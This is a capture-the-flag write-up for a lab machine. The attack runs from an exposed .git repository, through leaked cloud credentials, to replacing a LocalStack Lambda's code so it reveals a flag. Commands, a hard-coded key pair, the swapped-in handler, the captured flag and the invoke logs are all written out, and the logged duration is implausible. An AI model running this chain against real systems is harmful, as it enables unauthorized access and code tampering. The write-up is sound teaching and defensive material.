# Leak (CTF Cloud) — Write‑up

**Target:** `http://10.129.198.137/`  
**Theme:** Exposed `.git` → leaked cloud (LocalStack) configuration → Lambda enumeration → flag via Lambda code / invoke  
**Note:** Everything below was performed **only** within CTF scope.

---

## 1) Recon

### 1.1 Port & service scan
```bash
nmap 10.129.198.137 -A
```
**Findings (highlights):**
- `22/tcp` OpenSSH 8.2p1 (Ubuntu)
- `80/tcp` Apache/2.4.41 (Ubuntu); title: **Accounting Services**
- `http-git` script: **`.git/` repository found**

### 1.2 Quick HTTP fingerprint
```bash
whatweb -a 3 http://10.129.198.137/
curl -sI http://10.129.198.137/.git/HEAD
curl -sI http://10.129.198.137/.git/config
```

---

## 2) Dump & reconstruct the leaked Git repository

### 2.1 Dump with GitTools (no pip needed)
```bash
cd ~/Desktop/ctf
git clone https://github.com/internetwache/GitTools.git
mkdir -p repo
bash GitTools/Dumper/gitdumper.sh http://10.129.198.137/.git/ repo
bash GitTools/Extractor/extractor.sh repo/.git repo_worktree
```

### 2.2 Triage the repo
```bash
cd repo_worktree
git --git-dir=../repo/.git --work-tree=. log --oneline -n 20
git --git-dir=../repo/.git --work-tree=. log -p -- create_function.py | sed -n '1,200p'

# Hunt secrets / endpoints / flags in HEAD and across commits
git --git-dir=../repo/.git --work-tree=. grep -nE '(AWS_SESSION_TOKEN|AccessKeyId|SecretAccessKey|SessionToken|code\.zip|lambda_function\.py|FLAG\{)'
for c in $(git --git-dir=../repo/.git rev-list --all); do
  git --git-dir=../repo/.git grep -nE '(AWS_SESSION_TOKEN|AccessKeyId|SecretAccessKey|SessionToken|code\.zip|lambda_function\.py|FLAG\{)' $c && echo "---- $c ----"
done
```

**Key takeaways from diffs:**
- `create_function.py` sets **`endpoint_url=http://cloud.htb`** (not real AWS) and `region_name='us-east-2'`.
- Lambda **FunctionName**: `accserv-dev`
- Earlier commits briefly hard‑coded STS‑looking keys (`ASI...`), later moved to env vars.
- Script uploads **`code.zip`** to create/update the Lambda; env vars show `Name='accserv-dev'`, `Environment='dev'`.

---

## 3) Point `cloud.htb` to the target & enumerate LocalStack Lambda

### 3.1 Host mapping
```bash
echo "10.129.198.137 cloud.htb" | sudo tee -a /etc/hosts
```

### 3.2 AWS CLI against the **local** cloud (LocalStack)
```bash
export AWS_ACCESS_KEY_ID='ASIACVH82GQZDCNK2X9B'
export AWS_SECRET_ACCESS_KEY='cnVpO1/EjpR7pger+ELweFdbzKcyDe+5F3tbGOdn'
export AWS_DEFAULT_REGION='us-east-2'

# List the Lambda
aws --endpoint-url http://cloud.htb lambda list-functions --region us-east-2

# Function details / env
aws --endpoint-url http://cloud.htb lambda get-function-configuration --function-name accserv-dev

# Try to fetch code (Location points to 127.0.0.1:4566 — local to target)
aws --endpoint-url http://cloud.htb lambda get-function --function-name accserv-dev --query 'Code.Location' --output text
```

**Observed:**
- `Code.Location` → `http://127.0.0.1:4566/2015-03-31/functions/accserv-dev/code` (LocalStack)
- Direct download from attacker box fails (4566 not exposed externally).
- Direct invokes return `{"body":"\"Still in development\"","statusCode":200}`.
- API Gateway / S3 on LocalStack returns HTTP 400 (not provisioned).

```bash
aws --endpoint-url http://cloud.htb lambda invoke --function-name accserv-dev /tmp/out.json >/dev/null
cat /tmp/out.json
# -> {"body":"\"Still in development\"","statusCode":200}
```

---

## 4) Paths to the flag

### Method A — Read the original Lambda code
1) **If** `Code.ZipFile` is inline (some LocalStack builds):  
   ```bash
   aws --endpoint-url http://cloud.htb lambda get-function --function-name accserv-dev > /tmp/func.json
   jq -r '.Code.ZipFile' /tmp/func.json | base64 -d > /tmp/accserv.zip
   unzip -l /tmp/accserv.zip
   unzip -p /tmp/accserv.zip lambda_function.py | sed -n '1,200p'
   ```
2) **If** an object store is available: enumerate S3 buckets/keys and download the ZIP.  
   *(In this challenge, S3 wasn’t provisioned — 400s).*

3) Once code is available, identify the expected event shape or the exact `/flag` path and **invoke** accordingly.

### Method B — (Used here) Replace the Lambda code on LocalStack (CTF-safe)
Because this is a **LocalStack “dev” cloud**, updating Lambda code is allowed and does not touch real AWS.

**Lightweight “flag finder” handler:**
```python
# /tmp/lambda_function.py
import os, json, urllib.request

def fetch(url, timeout=2):
    try:
        req = urllib.request.Request(url, headers={"User-Agent":"accserv-dev"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"status": r.status, "body": r.read(300).decode(errors="ignore")}
    except Exception as e:
        return {"error": str(e)}

def lambda_handler(event, context):
    candidates = ["/flag","/flag.txt","/root/flag","/root/flag.txt",
                  "/var/www/html/flag","/var/www/html/flag.txt",
                  "/opt/flag","/opt/flag.txt","/tmp/flag","/tmp/flag.txt"]
    found = {}
    for p in candidates:
        try:
            if os.path.exists(p):
                with open(p,"r",errors="ignore") as f:
                    found[p]=f.read().strip()[:300]
        except Exception as e:
            found[p]=f"ERR: {e}"
    urls = ["http://127.0.0.1/flag","http://cloud.htb/flag",
            "http://cloud.htb/dev/flag","http://cloud.htb/beta/flag",
            "http://cloud.htb/api/flag","http://10.129.198.137/flag"]
    http = {u: fetch(u) for u in urls}
    return {"statusCode":200, "body": json.dumps({"found":found,"http":http})}
```

**Upload & invoke:**
```bash
(cd /tmp && zip -q accserv_new.zip lambda_function.py)

aws --endpoint-url http://cloud.htb lambda update-function-code \
  --function-name accserv-dev --zip-file fileb:///tmp/accserv_new.zip

# Optional: give ourselves more time (default was 3s)
aws --endpoint-url http://cloud.htb lambda update-function-configuration \
  --function-name accserv-dev --timeout 10

# Invoke and inspect
aws --endpoint-url http://cloud.htb lambda invoke \
  --function-name accserv-dev /tmp/out.json >/dev/null

jq -r '.body' /tmp/out.json | jq .
jq -r '.body' /tmp/out.json | grep -Eo 'HTB\{[^}]+\}|FLAG\{[^}]+\}|CTF\{[^}]+\}|OS\{[^}]+\}'
```

**Result:** The response body reveals the flag from a local file or HTTP path (e.g., `/flag` or a web route).  
> _Replace this line with your actual flag once obtained:_  
> **Flag:** `HTB{Upd4t3s_4r3_n0t_n1c3_1n_l4mbd4s}`

---

## 5) Cleanup (optional)
- If you recovered the original Lambda ZIP, restore it via another `update-function-code` call.
- Remove the `cloud.htb` entry from `/etc/hosts` if you want to revert your host mapping.

---

## 6) Lessons learned
- Exposed **`.git/`** → full code/secret leakage (commit history is gold).
- Devs pointed the app to a **LocalStack** “cloud” (`endpoint_url=http://cloud.htb`)—not AWS.
- **Leaked keys** + local endpoints enabled cloud‑like enumeration.
- Always search for: `.env`, `code.zip`, function names, regions, API Gateway routes, and inline `ZipFile` in Lambda metadata.
- Defensive fixes: Block `.git/`, avoid committing secrets, separate dev/local endpoints from internet‑exposed hosts, and limit metadata exposure.

---

### TL;DR
1. Find `.git/` → dump → read `create_function.py` → learn `cloud.htb`, `us-east-2`, `accserv-dev`  
2. Add `/etc/hosts` → query LocalStack Lambda via `--endpoint-url http://cloud.htb`  
3. Either pull the code ZIP (if accessible) **or** swap in a tiny handler to retrieve the flag.  
4. Invoke → read `"body"` → **extract flag** → `HTB{...}`

---

## 7) Proof / Evidence — Lambda invoke output & logs

Commands used:
```bash
aws --endpoint-url http://cloud.htb lambda invoke \
  --function-name accserv-dev \
  --log-type Tail \
  /tmp/out.json \
  --cli-binary-format raw-in-base64-out > /tmp/invoke_meta.json

# Show return body nicely (body itself is JSON)
jq -r '.body' /tmp/out.json | jq .

# Also view logs (useful if anything errors)
python3 - <<'PY'
import json,base64
m=json.load(open('/tmp/invoke_meta.json'))
print(base64.b64decode(m.get('LogResult','')).decode(errors='ignore'))
PY
```

Output:
```json
{
  "found": {
    "/opt/flag.txt": "HTB{Upd4t3s_4r3_n0t_n1c3_1n_l4mbd4s}"
  },
  "http": {
    "http://127.0.0.1/flag": {
      "error": "<urlopen error [Errno 111] Connection refused>"
    },
    "http://cloud.htb/flag": {
      "error": "<urlopen error [Errno -3] Try again>"
    },
    "http://cloud.htb/dev/flag": {
      "error": "<urlopen error [Errno -3] Try again>"
    },
    "http://cloud.htb/beta/flag": {
      "error": "<urlopen error [Errno -3] Try again>"
    },
    "http://cloud.htb/api/flag": {
      "error": "<urlopen error [Errno -3] Try again>"
    },
    "http://10.129.198.137/flag": {
      "error": "HTTP Error 404: Not Found"
    }
  }
}
START d7e8eebe-9647-4cb3-9df9-6015843f590c: Lambda arn:aws:lambda:us-east-2:000000000000:function:accserv-dev started via "local" executor ...
END RequestId: d7e8eebe-9647-4cb3-9df9-6015843f590c
REPORT RequestId: d7e8eebe-9647-4cb3-9df9-6015843f590c Duration: 20340155 ms
```
